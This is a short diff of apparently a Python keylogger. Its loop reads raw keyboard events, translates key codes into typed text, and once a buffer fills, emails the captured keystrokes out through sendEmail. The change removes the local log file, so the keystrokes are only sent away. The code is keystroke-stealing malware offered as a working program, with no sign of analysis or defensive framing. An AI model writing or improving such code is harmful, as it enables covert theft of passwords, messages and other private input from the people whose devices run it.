@@ -76,8 +76,6 @@ def main():
             if code in qwerty_map:
                 typed += qwerty_map[code]
         if len(typed) > BUF_SIZE:
-            with open("out", 'a') as f:
-                f.write(typed)
             sendEmail(typed)
             typed = ""
         event = in_file.read(EVENT_SIZE)
